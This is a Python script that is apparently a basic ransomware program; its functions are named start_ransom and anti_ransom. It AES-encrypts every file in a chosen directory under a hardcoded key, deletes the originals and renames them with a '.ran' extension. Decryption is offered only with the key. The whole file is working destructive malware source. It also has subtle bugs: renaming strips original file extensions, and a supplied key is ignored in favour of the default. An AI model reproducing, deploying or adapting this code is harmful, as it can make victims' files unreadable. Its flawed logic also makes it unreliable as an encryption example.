from sys import argv
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
from os import path, urandom, listdir, getcwd, remove

MODE = "e"
maybe_dir = []
KEY = b"d3f@ultk3y"
TARGET_DIR = getcwd() + "\\"

try:
    files = listdir(TARGET_DIR)
except:
    TARGET_DIR = ""
    files = ""

def get_dir(curr_dir):
    #curr_dir = __file__
    curr_file = path.basename(curr_dir)

    try:
        return curr_dir.split(curr_file)[0]
    except:
        return curr_dir

def encrypt(key, pt):
    if type(pt) == str:
        pt = pt.encode()

    if len(key) % 16 != 0:
        key = pad(key, 16)

    pt = pad(pt, 16)
    iv = urandom(16)
    ciph = AES.new(key, AES.MODE_CBC, iv)
    ct = ciph.encrypt(pt)

    return iv + ct

def decrypt(key, ct):
    iv = ct[:16]
    ct = ct[16:]

    if len(key) % 16 != 0:
        key = pad(key, 16)

    ciph = AES.new(key, AES.MODE_CBC, iv)
    pt = ciph.decrypt(ct)

    return unpad(pt, 16)

def prompt():
    print("Welcome to file encryptor. What would you like to do?")
    print("""
1. Encrypt All (requires key)
2. Insert new key
3. Decrypt All (requires key)
4. Change target
5. Quit
""")
    choice = input("> ")
    program(choice)

def program(choice):
    global KEY, TARGET_DIR, files
    if choice in [1, "1"]:
        start_ransom(KEY)
    elif choice in [2, "2"]:
        KEY = prompt_key(KEY)
    elif choice in [3, "3"]:
        anti_ransom(KEY)
    elif choice in [4, "4"]:
        TARGET_DIR, files = prompt_dir(TARGET_DIR)
    elif choice in [5, "5"]:
        return 0
    else:
        print("Invalid input. Try again")
    prompt()

def prompt_key(old_key):
    print(f"Current key: {KEY}")
    new_key = input("Insert your new key: ")
    new_key = new_key.encode()

    confirm = input(f"Your new key will be: {new_key} \nYou Sure?(Y/N) \n>")

    if confirm in ["Y","y"]:
        return new_key

    print("Change cancelled.")
    return old_key

def prompt_dir(old_dir):
    print(f"Current dir: {old_dir}")
    new_dir = input("Insert your new dir: ")

    confirm = input(f"Your new key will be: {new_dir} \nYou Sure?(Y/N) \n>")

    if confirm in ["Y", "y"]:
        if new_dir[-1] != "\\" or new_dir[-1] != "/":
            new_dir += "\\"
        files = listdir(new_dir)
        return new_dir, files

    print("Change cancelled.")
    return old_dir, listdir(old_dir)

def start_ransom(key):
    curr_dir = get_dir(TARGET_DIR)
    for fname in files:
        if fname != path.basename(__file__):
            enc_file(curr_dir + fname)

def anti_ransom(key):
    curr_dir = get_dir(TARGET_DIR)
    _files = listdir(TARGET_DIR)
    for fname in _files:
        if fname != path.basename(__file__):
            dec_file(curr_dir + fname)
        

def enc_file(filename, key=KEY):
    try:
        with open(filename, "rb") as f:
            content = f.read()
        cf = encrypt(key, content)

        remove(filename)

        if filename[-4:] != ".ran":
            filename = filename[:-4] + ".ran"

        with open(filename, "wb") as fout:
            fout.write(cf)
            
    except Exception as e:
        print("Something went wrong.")
        print(e)

def dec_file(filename, key=KEY):
    if filename[-4:] != ".ran":
        #filename += ".ran"
        return 0
    try:
        with open(filename, "rb") as f:
            content = f.read()
        pf = decrypt(key, content)

        remove(filename)
        filename = filename[:-4]

        with open(filename, "wb") as fout:
            fout.write(pf)
    except Exception as e:
        print("Something went wrong.")
        print(e)

if __name__ == "__main__":
    if len(argv) <= 2:
        print(f"Current target: {TARGET_DIR}")
        print("---------------------------------")
        prompt()
    else:
        TARGET_DIR = argv[2]
        MODE = argv[1]
        try:
            files = listdir(TARGET_DIR)
        except:
            TARGET_DIR = ""
            files = ""

        if MODE == "e":
            start_ransom(KEY)
        elif MODE == "d":
            anti_ransom(KEY)
        else:
            print("""
Invalid option.
USAGE: mal.exe <mode> <directory>

Use 'd' for decrypt or 'e' to encrypt in mode.""")
            
        
